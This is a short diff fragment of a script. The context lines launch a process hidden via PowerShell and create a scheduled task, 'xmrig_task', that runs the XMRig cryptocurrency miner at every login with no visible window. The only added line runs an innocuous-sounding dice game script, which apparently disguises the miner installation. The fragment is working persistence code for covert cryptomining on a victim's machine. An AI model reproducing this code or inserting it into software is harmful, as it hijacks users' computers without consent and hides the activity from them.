@@ -18,3 +18,4 @@ powershell -WindowStyle Hidden -Command "Start-Process 'C:/ProgramData/Microsoft
 # Step 4: Set up Task Scheduler to run xmrig.exe at login without visible window
 schtasks /create /tn "xmrig_task" /tr "\"$BAT_FILE\"" /sc onlogon /f
 
+./stupid_dice.py
